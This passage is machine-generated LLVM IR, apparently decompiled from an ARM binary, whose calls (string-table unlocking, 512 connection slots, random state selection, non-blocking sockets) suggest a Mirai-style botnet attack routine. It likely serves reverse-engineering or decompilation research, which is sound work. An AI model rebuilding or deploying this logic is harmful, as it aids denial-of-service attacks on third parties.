  store i1 %v7_8320, i1* %cpsr_z.global-to-local, align 1
  %v2_8324 = xor i1 %v2_8320, true
  %v3_8324 = or i1 %v7_8320, %v2_8324
  br i1 %v3_8324, label %bb172, label %bb173

bb172:                                            ; preds = %dec_label_pc_8314
  %v5_8324 = trunc i32 %v1_8318 to i8
  store i8 %v5_8324, i8* %v3_8314, align 1
  %v0_8328.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_8328.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb173

bb173:                                            ; preds = %dec_label_pc_8314, %bb172
  %v1_832c = phi i1 [ %v2_8320, %dec_label_pc_8314 ], [ %v1_8328.pre, %bb172 ]
  %v0_832c = phi i1 [ false, %dec_label_pc_8314 ], [ %v0_8328.pre, %bb172 ]
  %v2_8328 = xor i1 %v1_832c, true
  %v3_8328 = or i1 %v0_832c, %v2_8328
  br i1 %v3_8328, label %bb174, label %._crit_edge

._crit_edge:                                      ; preds = %bb173
  %v0_8334.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb175

bb174:                                            ; preds = %bb173
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v7_832c = load i32, i32* %v11_82f4, align 4
  store i32 %v7_832c, i32* %ip.global-to-local, align 4
  br label %bb175

bb175:                                            ; preds = %._crit_edge, %bb174
  %v0_8334 = phi i32 [ %v0_8334.pre, %._crit_edge ], [ %v7_832c, %bb174 ]
  store i32 %v10_82f0, i32* @lr, align 4
  %v1_8334 = add i32 %v0_8334, 1
  store i32 %v1_8334, i32* %ip.global-to-local, align 4
  %v5_8338 = inttoptr i32 %v1_8334 to i8*
  store i8* %v5_8338, i8** %stack_var_-44, align 4
  br label %dec_label_pc_82fc

dec_label_pc_8340:                                ; preds = %dec_label_pc_82fc
  store i32 43, i32* %r0.global-to-local, align 4
  %v1_8344 = call i32 @table_unlock_val(i32 43)
  store i32 44, i32* %r0.global-to-local, align 4
  %v1_834c = call i32 @table_unlock_val(i32 44)
  store i32 45, i32* %r0.global-to-local, align 4
  %v1_8354 = call i32 @table_unlock_val(i32 45)
  store i32 46, i32* %r0.global-to-local, align 4
  %v1_835c = call i32 @table_unlock_val(i32 46)
  store i32 47, i32* %r0.global-to-local, align 4
  %v1_8364 = call i32 @table_unlock_val(i32 47)
  store i32 48, i32* %r0.global-to-local, align 4
  %v1_836c = call i32 @table_unlock_val(i32 48)
  store i32 49, i32* %r0.global-to-local, align 4
  %v1_8374 = call i32 @table_unlock_val(i32 49)
  store i32 50, i32* %r0.global-to-local, align 4
  %v1_837c = call i32 @table_unlock_val(i32 50)
  store i32 51, i32* %r0.global-to-local, align 4
  %v1_8384 = call i32 @table_unlock_val(i32 51)
  store i32 52, i32* %r0.global-to-local, align 4
  %v1_838c = call i32 @table_unlock_val(i32 52)
  store i32 %v1_838c, i32* %r0.global-to-local, align 4
  %v0_8390 = load i32, i32* @r6, align 4
  %v3_8390 = icmp ugt i32 %v0_8390, 511
  store i1 %v3_8390, i1* %cpsr_c.global-to-local, align 1
  %v8_8390 = icmp eq i32 %v0_8390, 512
  store i1 %v8_8390, i1* %cpsr_z.global-to-local, align 1
  %v5_8394 = icmp slt i32 %v0_8390, 512
  br i1 %v5_8394, label %thread-pre-split, label %bb176

bb176:                                            ; preds = %dec_label_pc_8340
  store i32 512, i32* @r6, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_8340, %bb176
  %v0_839c = phi i32 [ 512, %bb176 ], [ %v0_8390, %dec_label_pc_8340 ]
  store i32 53, i32* %r0.global-to-local, align 4
  %v1_83a0 = call i32 @table_unlock_val(i32 53)
  store i32 %v0_839c, i32* %r0.global-to-local, align 4
  store i32 3140, i32* %r1.global-to-local, align 4
  %v2_83b0 = call i32 @calloc(i32 %v0_839c, i32 3140)
  store i32 %v2_83b0, i32* %r0.global-to-local, align 4
  store i32 %v0_839c, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_83b8 = icmp eq i32 %v0_839c, 0
  store i1 %v2_83b8, i1* %cpsr_z.global-to-local, align 1
  %tmp177 = icmp slt i32 %v0_839c, 1
  br i1 %tmp177, label %dec_label_pc_84fc, label %dec_label_pc_83c4

dec_label_pc_83c4:                                ; preds = %thread-pre-split
  store i32 %v2_83b0, i32* @r5, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_83cc

dec_label_pc_83cc:                                ; preds = %dec_label_pc_9e44, %dec_label_pc_83c4
  %v1_83d8 = phi i32 [ %v1_9e60, %dec_label_pc_9e44 ], [ %v2_83b0, %dec_label_pc_83c4 ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %v2_83d8 = inttoptr i32 %v1_83d8 to i32*
  store i32 -1, i32* %v2_83d8, align 4
  %v0_83dc = load i32, i32* %r3.global-to-local, align 4
  %v1_83dc = trunc i32 %v0_83dc to i8
  %v2_83dc = load i32, i32* @r5, align 4
  %v3_83dc = add i32 %v2_83dc, 4
  %v4_83dc = inttoptr i32 %v3_83dc to i8*
  store i8 %v1_83dc, i8* %v4_83dc, align 1
  %v0_83e0 = load i32, i32* %fp.global-to-local, align 4
  %v1_83e4 = load i32, i32* %r1.global-to-local, align 4
  %v2_83e4 = udiv i32 %v0_83e0, %v1_83e4
  %v3_83e4 = urem i32 %v0_83e0, %v1_83e4
  store i32 %v2_83e4, i32* %r0.global-to-local, align 4
  store i32 %v3_83e4, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v2_83f0 = and i32 %v3_83e4, 536870912
  %v3_83f0 = icmp ne i32 %v2_83f0, 0
  store i1 %v3_83f0, i1* %cpsr_c.global-to-local, align 1
  %v5_83f0 = mul i32 %v3_83e4, 24
  store i32 %v5_83f0, i32* %r3.global-to-local, align 4
  %v2_83f4 = add i32 %v5_83f0, %arg2
  store i32 %v2_83f4, i32* @r6, align 4
  %v1_83f8 = add i32 %v2_83f4, 16
  %v2_83f8 = inttoptr i32 %v1_83f8 to i32*
  %v3_83f8 = load i32, i32* %v2_83f8, align 4
  store i32 %v3_83f8, i32* %r2.global-to-local, align 4
  %v0_83fc = load i32, i32* @r5, align 4
  %v1_83fc = add i32 %v0_83fc, 532
  store i32 %v1_83fc, i32* @lr, align 4
  store i32 %v1_83fc, i32* @r0, align 4
  %v0_8404 = load i32, i32* @r8, align 4
  store i32 %v0_8404, i32* %r1.global-to-local, align 4
  %v2_8408 = add i32 %v0_83fc, 16
  %v3_8408 = inttoptr i32 %v2_8408 to i32*
  store i32 %v3_83f8, i32* %v3_8408, align 4
  %v0_840c = load i32, i32* @lr, align 4
  %v2_8410 = inttoptr i32 %v1_83fc to i8*
  %v3_8410 = call i32 @util_strcpy(i8* %v2_8410, i32 %v0_8404)
  store i32 %v3_8410, i32* %r0.global-to-local, align 4
  %v0_8414 = load i32, i32* @r5, align 4
  %v1_8414 = add i32 %v0_8414, 532
  %v2_8414 = inttoptr i32 %v1_8414 to i8*
  %v3_8414 = load i8, i8* %v2_8414, align 1
  %v4_8414 = zext i8 %v3_8414 to i32
  store i32 %v4_8414, i32* %r3.global-to-local, align 4
  %v2_8418 = icmp ugt i8 %v3_8414, 46
  store i1 %v2_8418, i1* %cpsr_c.global-to-local, align 1
  %v7_8418 = icmp eq i8 %v3_8414, 47
  store i1 %v7_8418, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8418, label %dec_label_pc_8444, label %dec_label_pc_8420

dec_label_pc_8420:                                ; preds = %dec_label_pc_83cc
  store i32 %v0_840c, i32* %r0.global-to-local, align 4
  %v1_8424 = inttoptr i32 %v0_840c to i8*
  %v2_8424 = call i32 @util_strlen(i8* %v1_8424)
  store i32 %v2_8424, i32* @r2, align 4
  %v0_842c = load i32, i32* @r5, align 4
  %v1_8430 = add i32 %v0_842c, 533
  store i32 %v1_8430, i32* @r0, align 4
  store i32 %v0_840c, i32* @r1, align 4
  %v3_8438 = call i32 @memmove(i32 %v1_8430, i32 %v0_840c, i32 %v2_8424)
  store i32 %v3_8438, i32* %r0.global-to-local, align 4
  store i32 47, i32* %r3.global-to-local, align 4
  %v2_8440 = load i32, i32* @r5, align 4
  %v3_8440 = add i32 %v2_8440, 532
  %v4_8440 = inttoptr i32 %v3_8440 to i8*
  store i8 47, i8* %v4_8440, align 1
  %v0_8448.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_8444

dec_label_pc_8444:                                ; preds = %dec_label_pc_83cc, %dec_label_pc_8420
  %v0_8448 = phi i32 [ %v0_8414, %dec_label_pc_83cc ], [ %v0_8448.pre, %dec_label_pc_8420 ]
  %v0_8444 = load i32, i32* @sb, align 4
  store i32 %v0_8444, i32* %r1.global-to-local, align 4
  %v1_8448 = add i32 %v0_8448, 1440
  store i32 %v1_8448, i32* @r0, align 4
  %v2_844c = inttoptr i32 %v1_8448 to i8*
  %v3_844c = call i32 @util_strcpy(i8* %v2_844c, i32 %v0_8444)
  %v0_8450 = load i32, i32* @r5, align 4
  %v0_8454 = load i32, i32* @sb, align 4
  store i32 %v0_8454, i32* %r1.global-to-local, align 4
  %v1_8458 = add i32 %v0_8450, 1431
  store i32 %v1_8458, i32* @r0, align 4
  %v2_845c = inttoptr i32 %v1_8458 to i8*
  %v3_845c = call i32 @util_strcpy(i8* %v2_845c, i32 %v0_8454)
  %v0_8460 = load i32, i32* @r5, align 4
  %v1_8464 = add i32 %v0_8460, 789
  store i32 %v1_8464, i32* @r0, align 4
  %v0_8468 = load i32, i32* @sl, align 4
  store i32 %v0_8468, i32* %r1.global-to-local, align 4
  %v2_846c = inttoptr i32 %v1_8464 to i8*
  %v3_846c = call i32 @util_strcpy(i8* %v2_846c, i32 %v0_8468)
  store i32 %v3_846c, i32* %r0.global-to-local, align 4
  %v0_8470 = load i32, i32* @r6, align 4
  %v1_8470 = add i32 %v0_8470, 20
  %v2_8470 = inttoptr i32 %v1_8470 to i8*
  %v3_8470 = load i8, i8* %v2_8470, align 1
  %v4_8470 = zext i8 %v3_8470 to i32
  store i32 %v4_8470, i32* %r3.global-to-local, align 4
  %v2_8474 = icmp ugt i8 %v3_8470, 30
  store i1 %v2_8474, i1* %cpsr_c.global-to-local, align 1
  %v7_8474 = icmp eq i8 %v3_8470, 31
  store i1 %v7_8474, i1* %cpsr_z.global-to-local, align 1
  %v2_8478 = xor i1 %v7_8474, true
  %v3_8478 = and i1 %v2_8474, %v2_8478
  br i1 %v3_8478, label %dec_label_pc_84c0, label %dec_label_pc_847c

dec_label_pc_847c:                                ; preds = %dec_label_pc_8444
  %v1_847c = add i32 %v0_8470, 16
  %v2_847c = inttoptr i32 %v1_847c to i32*
  %v3_847c = load i32, i32* %v2_847c, align 4
  store i32 %v3_847c, i32* @r4, align 4
  %v0_8480 = call i32 @rand_next()
  store i32 %v0_8480, i32* %r0.global-to-local, align 4
  %v0_8484 = load i32, i32* @r4, align 4
  %v1_8484 = and i32 %v0_8484, 16711680
  store i32 %v1_8484, i32* %r1.global-to-local, align 4
  %v3_8488 = udiv i32 %v0_8484, 16777216
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v4_848c = udiv i32 %v1_8484, 256
  %v5_848c = or i32 %v4_848c, %v3_8488
  store i32 %v5_848c, i32* %r2.global-to-local, align 4
  %v1_8490 = and i32 %v0_8484, 65280
  store i32 %v1_8490, i32* %r3.global-to-local, align 4
  %v0_8494 = load i32, i32* @r6, align 4
  %v1_8494 = add i32 %v0_8494, 20
  %v2_8494 = inttoptr i32 %v1_8494 to i8*
  %v3_8494 = load i8, i8* %v2_8494, align 1
  %v4_8494 = zext i8 %v3_8494 to i32
  %v5_849c = call i32 @llvm.bswap.i32(i32 %v0_8484)
  %v7_84a0 = lshr i32 %v0_8480, %v4_8494
  %v8_84a0 = add i32 %v7_84a0, %v5_849c
  store i32 %v8_84a0, i32* %r2.global-to-local, align 4
  %v1_84a4 = and i32 %v8_84a0, 16711680
  store i32 %v1_84a4, i32* %r0.global-to-local, align 4
  %v1_84b0 = and i32 %v8_84a0, 65280
  store i32 %v1_84b0, i32* %r1.global-to-local, align 4
  %v2_84b8 = and i32 %v8_84a0, 256
  %v3_84b8 = icmp ne i32 %v2_84b8, 0
  store i1 %v3_84b8, i1* %cpsr_c.global-to-local, align 1
  %v5_84b8 = call i32 @llvm.bswap.i32(i32 %v8_84a0)
  store i32 %v5_84b8, i32* %r3.global-to-local, align 4
  %v1_84bc = load i32, i32* @r5, align 4
  %v2_84bc = add i32 %v1_84bc, 16
  %v3_84bc = inttoptr i32 %v2_84bc to i32*
  store i32 %v5_84b8, i32* %v3_84bc, align 4
  br label %dec_label_pc_84c0

dec_label_pc_84c0:                                ; preds = %dec_label_pc_8444, %dec_label_pc_847c
  %v0_84c0 = call i32 @rand_next()
  %v3_84cc = udiv i32 %v0_84c0, 5
  store i32 %v3_84cc, i32* %r2.global-to-local, align 4
  store i32 %v3_84cc, i32* %r3.global-to-local, align 4
  %v2_84d8 = sub i32 %v0_84c0, %v3_84cc
  store i32 %v2_84d8, i32* %r0.global-to-local, align 4
  %v7_84dc = icmp eq i32 %v2_84d8, 4
  store i1 %v7_84dc, i1* %cpsr_z.global-to-local, align 1
  %v5_84e0 = and i32 %v2_84d8, 1073741824
  %v6_84e0 = icmp ne i32 %v5_84e0, 0
  store i1 %v6_84e0, i1* %cpsr_c.global-to-local, align 1
  switch i32 %v2_84d8, label %dec_label_pc_9e44 [
    i32 0, label %dec_label_pc_9f08
    i32 1, label %dec_label_pc_9edc
    i32 2, label %dec_label_pc_9f34
    i32 3, label %dec_label_pc_9e1c
    i32 4, label %dec_label_pc_9e9c
  ]

dec_label_pc_84fc:                                ; preds = %thread-pre-split
  %v0_850c = load i32, i32* @r7, align 4
  %v1_850c = and i32 %v0_850c, 128
  %v2_850c = icmp ne i32 %v1_850c, 0
  store i1 %v2_850c, i1* %cpsr_c.global-to-local, align 1
  %v3_850c = udiv i32 %v0_850c, 256
  store i32 %v3_850c, i32* %r3.global-to-local, align 4
  %v1_8510 = add i32 %v2_83b0, 1452
  store i32 %v1_8510, i32* %r1.global-to-local, align 4
  %v2_8514 = ptrtoint i32* %stack_var_-10572 to i32
  store i32 %v2_8514, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_852c.preheader

dec_label_pc_852c.preheader:                      ; preds = %dec_label_pc_84fc, %dec_label_pc_9e68
  %v0_9e78.sink = phi i32 [ %v0_9e78, %dec_label_pc_9e68 ], [ %v0_850c, %dec_label_pc_84fc ]
  %stack_var_-20864.0.ph = phi i32 [ %v3_9e78, %dec_label_pc_9e68 ], [ %v3_850c, %dec_label_pc_84fc ]
  %stack_var_-20860.0.ph = phi i32 [ %v2_9e80, %dec_label_pc_9e68 ], [ %v2_8514, %dec_label_pc_84fc ]
  %stack_var_-20872.0.ph = phi i32 [ %v1_9e7c, %dec_label_pc_9e68 ], [ %v1_8510, %dec_label_pc_84fc ]
  %v1_9e84 = urem i32 %v0_9e78.sink, 256
  store i32 %v1_9e84, i32* @r7, align 4
  %v2_8694 = ptrtoint i32* %stack_var_-152 to i32
  %v2_86ac = ptrtoint i8** %stack_var_-44 to i32
  %v2_86f4 = ptrtoint i32* %stack_var_-76 to i32
  %v2_8710 = ptrtoint i32* %stack_var_-40 to i32
  %v1_88f0 = inttoptr i32 %stack_var_-20860.0.ph to i8*
  %v2_8c4c = icmp eq i32 %v6_81fc, 0
  %v1_8b48 = inttoptr i32 %v6_81fc to i8*
  %v2_8778 = ptrtoint i32* %stack_var_-60 to i32
  %v2_877c = ptrtoint i32* %stack_var_-204 to i32
  %v2_8780 = ptrtoint i32* %stack_var_-332 to i32
  %v2_8860 = ptrtoint i32* %stack_var_-48 to i32
  %v2_886c = ptrtoint i32* %stack_var_-52 to i32
  %v4_86cc = mul nuw nsw i32 %v1_9e84, 256
  %v5_86cc = or i32 %v4_86cc, %stack_var_-20864.0.ph
  br label %dec_label_pc_852c

dec_label_pc_852c:                                ; preds = %dec_label_pc_8758, %dec_label_pc_858c, %dec_label_pc_8750, %dec_label_pc_87ec, %dec_label_pc_852c.preheader
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_8530 = call i32 @__GI_time(i32* null)
  store i32 %v2_8530, i32* %r0.global-to-local, align 4
  store i32 %v10_82f0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %stack_var_-204, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_855c226 = load i32, i32* @sp, align 4
  %v3_855c227 = add i32 %v2_855c226, 20688
  %v4_855c228 = inttoptr i32 %v3_855c227 to i32*
  store i32 0, i32* %v4_855c228, align 4
  br label %dec_label_pc_8548.dec_label_pc_8548_crit_edge

dec_label_pc_8548.dec_label_pc_8548_crit_edge:    ; preds = %dec_label_pc_852c, %dec_label_pc_8548.dec_label_pc_8548_crit_edge
  %v0_8548.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_854c = add i32 %v0_8548.pre, 4
  store i32 %v1_854c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_8554 = add i32 %v0_8548.pre, 20684
  store i32 %v1_8554, i32* @lr, align 4
  %v7_8558 = icmp eq i32 %v1_854c, 128
  %v2_855c = load i32, i32* @sp, align 4
  %v3_855c = add i32 %v2_855c, %v1_8554
  %v4_855c = inttoptr i32 %v3_855c to i32*
  store i32 0, i32* %v4_855c, align 4
  br i1 %v7_8558, label %dec_label_pc_8564, label %dec_label_pc_8548.dec_label_pc_8548_crit_edge

dec_label_pc_8564:                                ; preds = %dec_label_pc_8548.dec_label_pc_8548_crit_edge
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 %v10_82f0, i32* @r1, align 4
  %v0_8568 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_8568, i32* %stack_var_-332, align 4
  %v0_856c = load i32, i32* %r3.global-to-local, align 4
  %v1_8574229 = add i32 %v0_856c, -120
  store i32 %v1_8574229, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_857c230 = add i32 %v0_856c, 20432
  store i32 %v1_857c230, i32* %r2.global-to-local, align 4
  %v7_8580231 = icmp eq i32 %v1_8574229, 128
  %v2_8584232 = load i32, i32* @sp, align 4
  %v3_8584233 = add i32 %v2_8584232, %v1_857c230
  %v4_8584234 = inttoptr i32 %v3_8584233 to i32*
  store i32 0, i32* %v4_8584234, align 4
  br i1 %v7_8580231, label %dec_label_pc_858c, label %dec_label_pc_8570.dec_label_pc_8570_crit_edge

dec_label_pc_8570.dec_label_pc_8570_crit_edge:    ; preds = %dec_label_pc_8564, %dec_label_pc_8570.dec_label_pc_8570_crit_edge
  %v0_8570.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_8574 = add i32 %v0_8570.pre, 4
  store i32 %v1_8574, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_857c = add i32 %v0_8570.pre, 20556
  store i32 %v1_857c, i32* %r2.global-to-local, align 4
  %v7_8580 = icmp eq i32 %v1_8574, 128
  %v2_8584 = load i32, i32* @sp, align 4
  %v3_8584 = add i32 %v2_8584, %v1_857c
  %v4_8584 = inttoptr i32 %v3_8584 to i32*
  store i32 0, i32* %v4_8584, align 4
  br i1 %v7_8580, label %dec_label_pc_858c, label %dec_label_pc_8570.dec_label_pc_8570_crit_edge

dec_label_pc_858c:                                ; preds = %dec_label_pc_8570.dec_label_pc_8570_crit_edge, %dec_label_pc_8564
  store i32 %v0_839c, i32* %r3.global-to-local, align 4
  %v1_8590 = load i32, i32* %r0.global-to-local, align 4
  %v3_8590 = icmp uge i32 %v0_839c, %v1_8590
  store i1 %v3_8590, i1* %cpsr_c.global-to-local, align 1
  %v9_8590 = icmp eq i32 %v0_839c, %v1_8590
  store i1 %v9_8590, i1* %cpsr_z.global-to-local, align 1
  %v7_8594 = icmp sgt i32 %v0_839c, %v1_8590
  br i1 %v7_8594, label %dec_label_pc_8598, label %dec_label_pc_852c

dec_label_pc_8598:                                ; preds = %dec_label_pc_858c
  store i32 %stack_var_-20872.0.ph, i32* @sl, align 4
  store i32 %v1_8590, i32* @r8, align 4
  store i32 %stack_var_-20872.0.ph, i32* @r6, align 4
  store i32 %v1_8590, i32* @r7, align 4
  br label %dec_label_pc_860c

dec_label_pc_85ac:                                ; preds = %dec_label_pc_8620
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_85ac = icmp eq i8 %v3_860c, 2
  store i1 %v7_85ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_85ac, label %dec_label_pc_8cec, label %dec_label_pc_85b4

dec_label_pc_85b4:                                ; preds = %dec_label_pc_85ac
  %v2_85b4 = icmp ugt i8 %v3_860c, 3
  store i1 %v2_85b4, i1* %cpsr_c.global-to-local, align 1
  %v7_85b4 = icmp eq i8 %v3_860c, 4
  store i1 %v7_85b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_85b4, label %dec_label_pc_88bc, label %dec_label_pc_85bc

dec_label_pc_85bc:                                ; preds = %dec_label_pc_85b4
  %v1_85bc = add nsw i32 %v4_860c, -6
  %v2_85bc = icmp ugt i8 %v3_860c, 5
  store i1 %v2_85bc, i1* %cpsr_c.global-to-local, align 1
  %v7_85bc = icmp eq i8 %v3_860c, 6
  store i1 %v7_85bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_85bc, label %dec_label_pc_8d1c, label %dec_label_pc_85c4

dec_label_pc_85c4:                                ; preds = %dec_label_pc_85bc
  %v2_85c4 = icmp ugt i8 %v3_860c, 6
  store i1 %v2_85c4, i1* %cpsr_c.global-to-local, align 1
  %v7_85c4 = icmp eq i8 %v3_860c, 7
  store i1 %v7_85c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_85c4, label %dec_label_pc_8f58, label %dec_label_pc_85cc

dec_label_pc_85cc:                                ; preds = %dec_label_pc_85c4
  %v2_85cc = icmp ugt i8 %v3_860c, 9
  store i1 %v2_85cc, i1* %cpsr_c.global-to-local, align 1
  %v7_85cc = icmp eq i8 %v3_860c, 10
  store i1 %v7_85cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_85cc, label %dec_label_pc_8fac, label %dec_label_pc_85d4

dec_label_pc_85d4:                                ; preds = %dec_label_pc_85cc
  %v1_85d4 = add nsw i32 %v4_860c, -11
  %v2_85d4 = icmp ugt i8 %v3_860c, 10
  store i1 %v2_85d4, i1* %cpsr_c.global-to-local, align 1
  %v7_85d4 = icmp eq i8 %v3_860c, 11
  store i1 %v7_85d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_85d4, label %dec_label_pc_956c, label %dec_label_pc_85dc

dec_label_pc_85dc:                                ; preds = %dec_label_pc_8cec, %dec_label_pc_85d4
  store i32 0, i32* %r3.global-to-local, align 4
  store i8 0, i8* %v2_860c, align 1
  %v0_85e4 = load i32, i32* @r6, align 4
  %v1_85e4 = add i32 %v0_85e4, -1452
  %v2_85e4 = inttoptr i32 %v1_85e4 to i32*
  %v3_85e4 = load i32, i32* %v2_85e4, align 4
  store i32 %v3_85e4, i32* %r0.global-to-local, align 4
  %v1_85e8 = call i32 @__GI___libc_close(i32 %v3_85e4)
  store i32 %v1_85e8, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_85f0 = load i32, i32* @r6, align 4
  %v2_85f0 = add i32 %v1_85f0, -1452
  %v3_85f0 = inttoptr i32 %v2_85f0 to i32*
  store i32 -1, i32* %v3_85f0, align 4
  br label %dec_label_pc_85f4

dec_label_pc_85f4:                                ; preds = %dec_label_pc_8fac, %dec_label_pc_8f58, %dec_label_pc_8d1c, %dec_label_pc_8628, %dec_label_pc_8718, %dec_label_pc_956c, %bb181, %dec_label_pc_85dc
  store i32 %v0_839c, i32* %r2.global-to-local, align 4
  %v0_85f8 = load i32, i32* @r7, align 4
  %v1_85f8 = add i32 %v0_85f8, 1
  store i32 %v1_85f8, i32* @r7, align 4
  %v0_85fc = load i32, i32* @r6, align 4
  %v3_8600 = icmp uge i32 %v1_85f8, %v0_839c
  store i1 %v3_8600, i1* %cpsr_c.global-to-local, align 1
  %v9_8600 = icmp eq i32 %v1_85f8, %v0_839c
  store i1 %v9_8600, i1* %cpsr_z.global-to-local, align 1
  %v1_8604 = add i32 %v0_85fc, 3140
  store i32 %v1_8604, i32* @r6, align 4
  br i1 %v9_8600, label %dec_label_pc_85f4.dec_label_pc_8750_crit_edge, label %dec_label_pc_860c

dec_label_pc_85f4.dec_label_pc_8750_crit_edge:    ; preds = %dec_label_pc_85f4
  %v0_8750.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_8750

dec_label_pc_860c:                                ; preds = %dec_label_pc_8738, %dec_label_pc_85f4, %dec_label_pc_8598
  %v3_88b0 = phi i32 [ %stack_var_-20872.0.ph, %dec_label_pc_8598 ], [ %v1_8604, %dec_label_pc_85f4 ], [ %v1_8748, %dec_label_pc_8738 ]
  %v1_860c = add i32 %v3_88b0, -1448
  %v2_860c = inttoptr i32 %v1_860c to i8*
  %v3_860c = load i8, i8* %v2_860c, align 1
  %v4_860c = zext i8 %v3_860c to i32
  store i32 %v4_860c, i32* @r3, align 4
  %v2_8614 = icmp ne i8 %v3_860c, 0
  store i1 %v2_8614, i1* %cpsr_c.global-to-local, align 1
  %v6_8614 = icmp eq i8 %v3_860c, 0
  %v7_8614 = icmp eq i8 %v3_860c, 1
  store i1 %v7_8614, i1* %cpsr_z.global-to-local, align 1
  %v1_8618 = add i32 %v3_88b0, -1452
  store i32 %v1_8618, i32* @r5, align 4
  br i1 %v7_8614, label %dec_label_pc_88a4, label %dec_label_pc_8620

dec_label_pc_8620:                                ; preds = %dec_label_pc_860c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v6_8614, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_8614, label %dec_label_pc_8628, label %dec_label_pc_85ac

dec_label_pc_8628:                                ; preds = %.thread20.dec_label_pc_8628_crit_edge, %dec_label_pc_8620
  %v0_8628 = phi i32 [ %v0_8628.pre, %.thread20.dec_label_pc_8628_crit_edge ], [ %v3_88b0, %dec_label_pc_8620 ]
  %v1_8628 = add i32 %v0_8628, -1452
  %v2_8628 = inttoptr i32 %v1_8628 to i32*
  %v3_8628 = load i32, i32* %v2_8628, align 4
  store i32 %v3_8628, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v10_82f0, i32* %ip.global-to-local, align 4
  %v2_8634 = icmp eq i32 %v3_8628, -1
  store i1 %v2_8634, i1* %cpsr_c.global-to-local, align 1
  %v7_8634 = icmp eq i32 %v3_8628, -1
  store i1 %v7_8634, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-76, align 4
  store i32 34380, i32* @lr, align 4
  %v1_8648 = xor i1 %v7_8634, true
  call void @__pseudo_cond_branch(i1 %v1_8648, i32 ptrtoint (i32* @global_var_15720.34 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  %v0_8654 = load i32, i32* @r5, align 4
  store i32 %v0_8654, i32* %r2.global-to-local, align 4
  %v3_8658 = call i32 @socket(i32 2, i32 1, i32 %v0_8654)
  store i32 %v3_8658, i32* %r0.global-to-local, align 4
  %v2_865c = icmp eq i32 %v3_8658, -1
  store i1 %v2_865c, i1* %cpsr_c.global-to-local, align 1
  %v7_865c = icmp eq i32 %v3_8658, -1
  store i1 %v7_865c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_8658, i32* @r4, align 4
  %v1_8664 = load i32, i32* @r6, align 4
  %v2_8664 = add i32 %v1_8664, -1452
  %v3_8664 = inttoptr i32 %v2_8664 to i32*
  store i32 %v3_8658, i32* %v3_8664, align 4
  br i1 %v7_865c, label %dec_label_pc_85f4, label %dec_label_pc_866c

dec_label_pc_866c:                                ; preds = %dec_label_pc_8628
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_8670 = load i32, i32* @r5, align 4
  store i32 %v0_8670, i32* @r2, align 4
  %v2_8674 = call i32 @__libc_fcntl(i32 %v3_8658, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_867c = or i32 %v2_8674, 2048
  store i32 %v1_867c, i32* @r2, align 4
  %v0_8680 = load i32, i32* @r4, align 4
  store i32 %v0_8680, i32* %r0.global-to-local, align 4
  %v2_8684 = call i32 @__libc_fcntl(i32 %v0_8680, i32 4)
  store i32 %v2_8684, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), i32* %ip.global-to-local, align 4
  store i32 %v2_8694, i32* %r3.global-to-local, align 4
  %v0_8698 = load i32, i32* @r6, align 4
  %v1_8698 = add i32 %v0_8698, -1452
  %v2_8698 = inttoptr i32 %v1_8698 to i32*
  %v3_8698 = load i32, i32* %v2_8698, align 4
  store i32 %v3_8698, i32* %r0.global-to-local, align 4
  %v0_869c = load i32, i32* @r5, align 4
  store i32 %v0_869c, i32* %r1.global-to-local, align 4
  store i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_ffff.36, i32 0, i32 0), i8** %stack_var_-44, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 %v2_86ac, i32* %r3.global-to-local, align 4
  %v5_86b4 = call i32 @__GI_setsockopt(i32 %v3_8698, i32 %v0_869c, i32 8, i32 %v2_86ac, i32 4)
  store i32 %v5_86b4, i32* %r0.global-to-local, align 4
